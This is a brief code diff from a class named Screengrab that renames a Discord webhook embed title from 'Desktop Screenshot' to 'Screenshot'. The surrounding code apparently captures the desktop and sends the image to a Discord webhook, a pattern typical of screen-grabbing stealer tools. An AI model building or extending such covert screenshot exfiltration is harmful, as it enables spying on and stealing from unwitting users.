@@ -993,7 +993,7 @@ class Screengrab:
             "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096",
             "embeds": [
                 {
-                    "title": "Desktop Screenshot",
+                    "title": "Screenshot",
                     "image": {
                         "url": "attachment://image.png"
                     }
